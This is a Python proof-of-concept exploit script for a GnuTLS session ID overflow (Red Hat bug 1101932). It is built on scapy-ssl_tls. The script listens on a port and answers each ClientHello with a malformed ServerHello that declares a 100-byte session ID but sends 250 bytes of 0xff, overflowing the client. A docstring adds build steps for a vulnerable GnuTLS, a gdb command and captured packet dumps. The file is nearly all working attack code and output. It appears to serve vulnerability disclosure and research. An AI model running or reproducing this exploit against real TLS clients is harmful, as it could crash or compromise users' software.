#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : tintinweb@oststrom.com <github.com/tintinweb>
#
# ref: https://bugzilla.redhat.com/show_bug.cgi?id=1101932
#
'''
    # wget http://www.lysator.liu.se/~nisse/archive/nettle-2.5.tar.gz
    # tar xvfz nettle-2.5.tar.gz
    # cd nettle-2.5/
    # aptitude install libgmp-dev
    # ./configure --enable-shared --prefix=/usr
    # make
    # make install
    # cd ../gnutls-3.1.24/
    # ./configure --with-libnettle-prefix=/usr
    # make
    # gdb --args ./src/.libs/lt-gnutls-cli-debug 192.168.139.1

[!] new client ('127.0.0.1', 36396) connected!
###[ SSL/TLS ]###
  \records   \
   |###[ TLS Record ]###
   |  content_type= handshake
   |  version   = TLS_1_0
   |  length    = 0x12d
   |###[ TLS Handshake ]###
   |     type      = client_hello
   |     length    = 0x129
   |###[ TLS Client Hello ]###
   |        version   = TLS_1_2
   |        gmt_unix_time= 2160684724L
   |        random_bytes= '\xfd-2\xecL\x0fcM\xd2`\x8d\xc5\\\r\xd0\xa3\x03\x98h\xa93\xbe\x9b\xeb<\xac\xa4\x01'
   |        session_id_length= 0x0
   |        session_id= ''
   |        cipher_suites_length= 0x92
   |        cipher_suites= ['ECDHE_RSA_WITH_AES_256_GCM_SHA384', 'ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', 'ECDHE_RSA_WITH_AES_256_CBC_SHA384', 'ECDHE_ECDSA_WITH_AES_256_CBC_SHA384', 'ECDHE_RSA_WITH_AES_256_CBC_SHA', 'ECDHE_ECDSA_WITH_AES_256_CBC_SHA', 'DHE_DSS_WITH_AES_256_GCM_SHA384', 'DHE_RSA_WITH_AES_256_GCM_SHA384', 'DHE_RSA_WITH_AES_256_CBC_SHA256', 'DHE_DSS_WITH_AES_256_CBC_SHA256', 'DHE_RSA_WITH_AES_256_CBC_SHA', 'DHE_DSS_WITH_AES_256_CBC_SHA', 'DHE_RSA_WITH_CAMELLIA_256_CBC_SHA', 'DHE_DSS_WITH_CAMELLIA_256_CBC_SHA', 'ECDH_RSA_WITH_AES_256_GCM_SHA384', 'ECDH_ECDSA_WITH_AES_256_GCM_SHA384', 'ECDH_RSA_WITH_AES_256_CBC_SHA384', 'ECDH_ECDSA_WITH_AES_256_CBC_SHA384', 'ECDH_RSA_WITH_AES_256_CBC_SHA', 'ECDH_ECDSA_WITH_AES_256_CBC_SHA', 'RSA_WITH_AES_256_GCM_SHA384', 'RSA_WITH_AES_256_CBC_SHA256', 'RSA_WITH_AES_256_CBC_SHA', 'RSA_WITH_CAMELLIA_256_CBC_SHA', 'ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', 'ECDHE_RSA_WITH_AES_128_CBC_SHA256', 'ECDHE_ECDSA_WITH_AES_128_CBC_SHA256', 'ECDHE_RSA_WITH_AES_128_CBC_SHA', 'ECDHE_ECDSA_WITH_AES_128_CBC_SHA', 'DHE_DSS_WITH_AES_128_GCM_SHA256', 'DHE_RSA_WITH_AES_128_GCM_SHA256', 'DHE_RSA_WITH_AES_128_CBC_SHA256', 'DHE_DSS_WITH_AES_128_CBC_SHA256', 'DHE_RSA_WITH_AES_128_CBC_SHA', 'DHE_DSS_WITH_AES_128_CBC_SHA', 'DHE_RSA_WITH_SEED_CBC_SHA', 'DHE_DSS_WITH_SEED_CBC_SHA', 'DHE_RSA_WITH_CAMELLIA_128_CBC_SHA', 'DHE_DSS_WITH_CAMELLIA_128_CBC_SHA', 'ECDH_RSA_WITH_AES_128_GCM_SHA256', 'ECDH_ECDSA_WITH_AES_128_GCM_SHA256', 'ECDH_RSA_WITH_AES_128_CBC_SHA256', 'ECDH_ECDSA_WITH_AES_128_CBC_SHA256', 'ECDH_RSA_WITH_AES_128_CBC_SHA', 'ECDH_ECDSA_WITH_AES_128_CBC_SHA', 'RSA_WITH_AES_128_GCM_SHA256', 'RSA_WITH_AES_128_CBC_SHA256', 'RSA_WITH_AES_128_CBC_SHA', 'RSA_WITH_SEED_CBC_SHA', 'RSA_WITH_CAMELLIA_128_CBC_SHA', 'ECDHE_RSA_WITH_RC4_128_SHA', 'ECDHE_ECDSA_WITH_RC4_128_SHA', 'ECDH_RSA_WITH_RC4_128_SHA', 'ECDH_ECDSA_WITH_RC4_128_SHA', 'RSA_WITH_RC4_128_SHA', 'RSA_WITH_RC4_128_MD5', 'ECDHE_RSA_WITH_3DES_EDE_CBC_SHA', 'ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA', 'DHE_RSA_WITH_3DES_EDE_CBC_SHA', 'DHE_DSS_WITH_3DES_EDE_CBC_SHA', 'ECDH_RSA_WITH_3DES_EDE_CBC_SHA', 'ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA', 'RSA_WITH_3DES_EDE_CBC_SHA', 'DHE_RSA_WITH_DES_CBC_SHA', 'DHE_DSS_WITH_DES_CBC_SHA', 'RSA_WITH_DES_CBC_SHA', 'DHE_RSA_EXPORT_WITH_DES40_CBC_SHA', 'DHE_DSS_EXPORT_WITH_DES40_CBC_SHA', 'RSA_EXPORT_WITH_DES40_CBC_SHA', 'RSA_EXPORT_WITH_RC2_CBC_40_MD5', 'RSA_EXPORT_WITH_RC4_40_MD5', 'EMPTY_RENEGOTIATION_INFO_SCSV']
   |        compression_methods_length= 0x2
   |        compression_methods= ['DEFLATE', 'NULL']
   |        extensions_length= 0x6d
   |        \extensions\
   |         |###[ TLS Extension ]###
   |         |  type      = ec_point_formats
   |         |  length    = 0x4
   |         |###[ TLS Extension EC Points Format ]###
   |         |     length    = 0x3
   |         |     ec_point_formats= ['uncompressed', 'ansiX962_compressed_prime', 'ansiX962_compressed_char2']
   |         |###[ TLS Extension ]###
   |         |  type      = supported_groups
   |         |  length    = 0x34
   |         |###[ TLS Extension Elliptic Curves ]###
   |         |     length    = 0x32
   |         |     elliptic_curves= ['sect571r1', 'sect571k1', 'secp521r1', 'sect409k1', 'sect409r1', 'secp384r1', 'sect283k1', 'sect283r1', 'secp256k1', 'secp256r1', 'sect239k1', 'sect233k1', 'sect233r1', 'secp224k1', 'secp224r1', 'sect193r1', 'sect193r2', 'secp192k1', 'secp192r1', 'sect163k1', 'sect163r1', 'sect163r2', 'secp160k1', 'secp160r1', 'secp160r2']
   |         |###[ TLS Extension ]###
   |         |  type      = SessionTicket TLS
   |         |  length    = 0x0
   |         |###[ TLS Extension ]###
   |         |  type      = signature_algorithms
   |         |  length    = 0x20
   |         |###[ TLS Extension Signature And Hash Algorithm ]###
   |         |     length    = 0x1e
   |         |     \algorithms\
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha512
   |         |      |  signature_algorithm= rsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha512
   |         |      |  signature_algorithm= dsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha512
   |         |      |  signature_algorithm= ecdsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha384
   |         |      |  signature_algorithm= rsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha384
   |         |      |  signature_algorithm= dsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha384
   |         |      |  signature_algorithm= ecdsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha256
   |         |      |  signature_algorithm= rsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha256
   |         |      |  signature_algorithm= dsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha256
   |         |      |  signature_algorithm= ecdsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha224
   |         |      |  signature_algorithm= rsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha224
   |         |      |  signature_algorithm= dsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha224
   |         |      |  signature_algorithm= ecdsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha1
   |         |      |  signature_algorithm= rsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha1
   |         |      |  signature_algorithm= dsa
   |         |      |###[ TLS Signature Hash Algorithm Pair ]###
   |         |      |  hash_algorithm= sha1
   |         |      |  signature_algorithm= ecdsa
   |         |###[ TLS Extension ]###
   |         |  type      = heartbeat
   |         |  length    = 0x1
   |         |###[ TLS Extension HeartBeat ]###
   |         |     mode      = peer_allowed_to_send
[*] received TLSClientHello, sending malicious server hello
###[ TLS Record ]###
  content_type= handshake
  version   = SSL_3_0
  length    = None
###[ TLS Handshake ]###
     type      = server_hello
     length    = None
###[ TLS Server Hello ]###
        version   = SSL_3_0
        gmt_unix_time= 1453065593
        random_bytes= '\x99\x84\x08\x97\xa0I\n\xe3\xcf\xcb\xc96\x9d\x99pw\x06P\x11\xc8\xdd\xe1\x83\xea.\xef\x15\x16'
        session_id_length= 0x64
        session_id= '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
        cipher_suite= RSA_WITH_3DES_EDE_CBC_SHA
        compression_method= NULL
        \extensions\
'''

import os
import sys
import socket

from scapy.all import conf, log_interactive

try:
    # This import works from the project directory
    basedir = os.path.abspath(os.path.join(os.path.dirname(__file__),"../"))
    sys.path.append(basedir)
    from scapy_ssl_tls.ssl_tls_automata import TLSServerAutomata
    from scapy_ssl_tls.ssl_tls import *
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers.ssl_tls_automata import TLSServerAutomata
    from scapy.layers.ssl_tls import *


def main():
    host = sys.argv[1] if len(sys.argv)>1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv)>2 else 443
    target = host,port

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(target)
    sock.listen(1)
    print "[ ] listening on %s ..."%repr(target) 
            
    while True:
        client_sock, client_addr = sock.accept()
        print "[!] new client %s connected!"%repr(client_addr)
        
        tlssock = TLSSocket(client_sock, client=False)
        
        p_client_hello = tlssock.recvall()
        p_client_hello.show()
        
        if not p_client_hello.haslayer(TLSClientHello):
            print "[!] did not receive a TLSClientHello from client, disconnecting."
            client_sock.close()
            continue
        print "[*] received TLSClientHello, sending malicious server hello (announcing sessid_len=100, sending 250 bytes)"
        
        cipher =  p_client_hello[TLSClientHello].cipher_suites[0] if TLSCipherSuite.RSA_WITH_AES_128_CBC_SHA not in p_client_hello[TLSClientHello].cipher_suites else TLSCipherSuite.RSA_WITH_AES_128_CBC_SHA
        
        p_server_hello = TLSRecord(version=p_client_hello[TLSHandshake].version)/TLSHandshake()/ \
                            TLSServerHello(version=p_client_hello[TLSHandshake].version, 
                                            compression_method = TLSCompressionMethod.NULL,
                                            cipher_suite = cipher,
                                            session_id_length = 100,
                                            session_id = '\xff'*250,     # overflow
                                            )
    
        p_server_hello.show()
        tlssock.sendall(p_server_hello)

if __name__=="__main__":
    main()
    